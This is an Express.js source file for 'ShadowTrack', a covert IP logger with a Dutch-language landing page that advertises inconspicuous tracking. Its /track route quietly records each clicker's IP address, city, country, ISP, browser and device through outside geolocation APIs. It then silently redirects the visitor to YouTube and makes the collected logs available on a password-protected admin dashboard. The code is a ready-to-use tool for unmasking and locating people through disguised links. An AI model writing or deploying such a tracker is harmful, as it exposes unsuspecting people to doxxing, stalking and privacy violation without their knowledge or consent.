const express = require('express');
const dotenv = require('dotenv');
const uaParser = require('ua-parser-js');
const basicAuth = require('express-basic-auth');
const fs = require('fs');

dotenv.config();

const app = express();
app.use(express.static('public'));
app.use(express.json());

const auth = basicAuth({
  users: { [process.env.ADMIN_USER]: process.env.ADMIN_PASS },
  challenge: true
});

// === MOEIE LANDING PAGE ===
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="nl">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>ShadowTrack</title>
      <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        
        body {
          margin: 0;
          padding: 0;
          font-family: 'Inter', sans-serif;
          background: linear-gradient(135deg, #0a0a0a, #1a0033);
          color: white;
          height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          overflow: hidden;
        }

        .container {
          text-align: center;
          z-index: 2;
        }

        h1 {
          font-size: 4.5rem;
          margin: 0;
          background: linear-gradient(90deg, #00ff88, #00ccff);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          text-shadow: 0 0 40px rgba(0, 255, 136, 0.5);
        }

        .subtitle {
          font-size: 1.4rem;
          margin: 20px 0 40px;
          opacity: 0.9;
        }

        .btn {
          display: inline-block;
          padding: 16px 40px;
          font-size: 1.2rem;
          background: #00ff88;
          color: black;
          text-decoration: none;
          border-radius: 50px;
          font-weight: 700;
          transition: all 0.3s;
          box-shadow: 0 10px 30px rgba(0, 255, 136, 0.4);
        }

        .btn:hover {
          transform: translateY(-5px);
          box-shadow: 0 15px 40px rgba(0, 255, 136, 0.6);
        }

        .glow {
          position: absolute;
          width: 600px;
          height: 600px;
          background: radial-gradient(circle, rgba(0,255,136,0.15) 0%, transparent 70%);
          border-radius: 50%;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          z-index: 1;
          animation: pulse 8s infinite;
        }

        @keyframes pulse {
          0%, 100% { opacity: 0.6; }
          50% { opacity: 1; }
        }
      </style>
    </head>
    <body>
      <div class="glow"></div>
      <div class="container">
        <h1>SHADOWTRACK</h1>
        <p class="subtitle">Geavanceerde IP Tracking & Analytics</p>
        <a href="/admin" class="btn">OPEN DASHBOARD →</a>
        
        <p style="margin-top: 60px; opacity: 0.6; font-size: 0.95rem;">
          Snel • Onopvallend • Krachtig
        </p>
      </div>
    </body>
    </html>
  `);
});

// === TRACKER ===
app.get('/track/:id', async (req, res) => {
  const trackerId = req.params.id;
  let ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace('::ffff:', '');
  
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const referer = req.headers.referer || 'Direct';

  let destinationUrl = "https://youtube.com";

  try {
    const parser = uaParser(userAgent);

    let geo = {};
    try {
      // Betere geo detectie (meerdere pogingen)
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,lat,lon,isp,org`);
      geo = await geoRes.json();

      if (geo.status !== 'success') {
        // Fallback
        const fallbackRes = await fetch(`https://ipapi.co/${ip}/json/`);
        geo = await fallbackRes.json();
      }
    } catch (e) {
      console.log("Geo lookup failed");
    }

    const log = {
      timestamp: new Date().toISOString(),
      tracker_id: trackerId,
      ip: ip,
      country: geo.country || geo.country_name || 'Unknown',
      city: geo.city || geo.region || 'Unknown',
      isp: geo.isp || geo.org || 'Unknown',
      browser: parser.browser.name || 'Unknown',
      os: parser.os.name || 'Unknown',
      device: parser.device.type || 'desktop',
      useragent: userAgent,
      referer: referer
    };

    fs.appendFileSync('logs.txt', JSON.stringify(log) + '\n');
    console.log(`✅ Gelogd → ${trackerId} | IP: ${ip} | ${geo.country || ''} ${geo.city || ''}`);

  } catch (error) {
    console.error("Error:", error);
  }

  let html = fs.readFileSync(__dirname + '/views/redirect.html', 'utf8');
  html = html.replace("{{DESTINATION_URL}}", destinationUrl);
  res.send(html);
});

// ADMIN & LOGS (blijft hetzelfde)
app.get('/admin', auth, (req, res) => res.sendFile(__dirname + '/views/admin.html'));

app.get('/api/logs', auth, (req, res) => {
  if (fs.existsSync('logs.txt')) {
    const data = fs.readFileSync('logs.txt', 'utf8');
    const logs = data.trim().split('\n').filter(Boolean).map(line => JSON.parse(line));
    res.json(logs.reverse());
  } else {
    res.json([]);
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ IP Logger draait op poort ${PORT}`);
});